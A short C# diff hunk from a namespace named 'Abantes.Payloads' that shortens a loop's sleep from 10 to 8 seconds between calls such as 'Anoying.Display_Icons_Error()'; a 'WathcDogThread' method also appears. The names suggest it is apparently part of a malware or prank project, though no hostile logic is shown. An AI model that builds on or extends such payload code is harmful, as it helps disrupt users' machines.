@@ -74,7 +74,7 @@ namespace Abantes.Payloads
                         Anoying.Display_Icons_Error();
                         break;
                 }
-                Thread.Sleep(10000);
+                Thread.Sleep(8000);
             }
         }
         public static void WathcDogThread()
